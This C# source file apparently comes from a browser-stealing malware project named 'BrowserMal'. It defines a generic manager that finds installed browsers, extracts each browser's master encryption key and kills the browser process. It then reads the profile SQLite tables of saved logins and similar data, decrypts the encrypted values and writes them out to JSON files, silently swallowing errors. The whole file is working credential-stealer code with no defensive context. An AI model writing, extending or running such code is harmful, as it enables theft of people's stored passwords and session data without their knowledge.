using BrowserMal.AES;
using BrowserMal.Browser;
using BrowserMal.Filesaver;
using BrowserMal.Util;
using System;
using System.Collections.Generic;
using System.IO;
using BrowserMal.SQLite;
using BrowserMal.Model;

namespace BrowserMal.Manager
{
    public class GenericManager<T>
    {
        private readonly string tableName;
        private readonly SqliteTableModel sqliteTableModel;

        public GenericManager(string tableName, SqliteTableModel sqliteTableModel)
        {
            this.tableName = tableName;
            this.sqliteTableModel = sqliteTableModel;
        }

        public void Init(ref List<BrowserModel> browsers, string profileType)
        {
            try
            {
                foreach (BrowserModel browser in browsers)
                {
                    if (!Directory.Exists(browser.Location))
                        continue;

                    byte[] key = AesGcm256.GetMasterKey(browser.Location);

                    if (key == null)
                        continue;

                    browser.MasterKey = key;
                    ProcessUtil.KillProcess(browser.ProcessName);

                    List<T> result = GetLogins(browser.Location, browser.MasterKey, profileType);

                    if (result.Count == 0)
                        continue;

                    FileManager.Save<T>(result, $"{browser.Name}_{tableName}.json");
                }
            }
            catch { }
        }

        private List<T> GetLogins(string path, byte[] masterKey, string profileType)
        {
            List<string> profiles = Browser.Util.GetAllProfiles(path, profileType);
            List<T> creds = new List<T>();

            foreach (string profile in profiles)
            {
                if (!File.Exists(profile))
                    continue;

                creds.AddRange(GetProfileLogins(profile, masterKey));
            }

            return creds;
        }

        private T CreateInstanceOfType(object[] args) => (T)Activator.CreateInstance(typeof(T), args);

        private List<T> GetProfileLogins(string path, byte[] masterKey)
        {
            List<T> generic = new List<T>();

            SqliteHandler sqLiteHandler = new SqliteHandler(path);
            sqLiteHandler.ReadTable(tableName);

            for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
            {
                try
                {
                    string[] values = GrabSqliteValues(sqliteTableModel.GetColumns(), ref sqLiteHandler, i, masterKey);

                    /*if (string.IsNullOrEmpty(values.Last()) && lastArgEncrypted)
                        continue;*/

                    T obj = CreateInstanceOfType(values);
                    generic.Add(obj);
                 
                }
                catch { }
            }

            return generic;
        }

        private string[] GrabSqliteValues(List<ColumnModel> columns, ref SqliteHandler sqLiteHandler, int row, byte[] masterKey)
        {
            string[] values = new string[columns.Count];

            for (int i = 0; i < columns.Count; i++)
            {
                string value;
                if (columns[i].IsEncrypted())
                {
                    value = AesGcm256.GetEncryptedValue(sqLiteHandler.GetValue(row, columns[i].GetName()), masterKey);
                }
                else
                {
                    value = sqLiteHandler.GetValue(row, columns[i].GetName());
                }

                if (columns[i].IsNeedsFormatting())
                {
                    values[i] = (string)columns[i].Format(value);
                    continue;
                }
                values[i] = value;
            }
           
            return values;
        }
    }
}
